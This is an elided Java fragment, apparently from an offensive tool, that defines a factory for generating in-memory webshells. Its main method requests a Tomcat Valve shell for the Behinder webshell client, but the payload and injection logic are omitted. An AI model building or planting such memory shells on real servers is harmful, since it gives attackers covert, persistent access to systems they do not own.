...
public class MemroyFactory {
     ...
     * @return
     */
    public String getMemoryShell(String type, String middleware,String password,String shellType,String path) {
        try {
            ...
            String implStr =(String) o.getClass().getMethod("get", Object.class, String.class).invoke(o, o, shellType);
            String format="";
            ...
            String addStrType = (String)o1.getClass().getMethod("get", Object.class, String.class).invoke(o1, o1, type);
    ...
    public static void main(String[] args) {
        System.out.println(MemroyFactory.instance().getMemoryShell("Tomcat","Valve","","Behinder",""));
    }
